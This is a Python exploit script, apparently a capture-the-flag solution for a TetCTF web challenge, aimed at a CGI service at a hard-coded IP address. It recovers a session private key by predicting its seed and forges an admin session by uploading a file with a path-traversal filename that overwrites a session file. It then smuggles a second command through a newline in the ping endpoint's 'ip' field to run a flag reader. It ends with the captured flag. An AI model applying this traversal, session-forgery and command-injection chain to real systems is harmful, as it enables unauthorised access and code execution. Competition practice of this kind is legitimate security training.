#!/usr/bin/env python3
from pwn import *
import requests

B62 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
UPLOADS = "/home/simpleweb/uploads/"
SESSION0 = "session/c0"
OVERWRITE = "../" + SESSION0.rjust(254 - len(UPLOADS) - 3, "/") + ".png"
print(f"{OVERWRITE=}")
assert (UPLOADS + OVERWRITE)[:254].endswith(SESSION0)


def main():
    url = "http://18.220.157.154:8080"
    while True:
        r = requests.get(f"{url}/cgi-bin/platform.cgi", allow_redirects=False)
        uuid = r.cookies["uuid"]
        print(f"{uuid=}")
        hash = 0
        for c in uuid:
            hash = ((hash << 2) ^ B62.index(c)) & 0xFFFFFFFF
        print(f"{hash=}")
        with open("index", "rb") as fp:
            fp.seek(hash * 4)
            (seed,) = struct.unpack("<I", fp.read(4))
        print(f"{seed=}")
        if seed != 0:
            full = subprocess.check_output(["./calc", str(seed)]).decode().strip()
            print(f"{full=}")
            if full.startswith(uuid):
                break
    privatekey = full[len(uuid) :]
    print(f"{privatekey=}")
    r = requests.post(
        f"{url}/cgi-bin/upload.cgi",
        cookies={
            "uuid": uuid,
            "privatekey": privatekey,
        },
        files={
            "file": (
                OVERWRITE,
                flat(
                    {
                        0x0: uuid.encode() + b"\0",
                        0x20: struct.pack("<I", 1),  # is_admin
                        0x24: privatekey.encode() + b"\0",
                        0x64: struct.pack("<I", 0x7FFFFFFF),  # timestamp
                    }
                ),
            ),
        },
    )
    print(r.text)
    r.raise_for_status()
    r = requests.post(
        f"{url}/cgi-bin/ping.cgi",
        cookies={
            "uuid": uuid,
            "privatekey": privatekey,
        },
        data={
            "ip": "8.8.8.8\n/home/simpleweb/readflag",
        },
    )
    print(r.text)
    # TetCTF{Simpl3_HTTP_service_MjA0OQ}


if __name__ == "__main__":
    main()
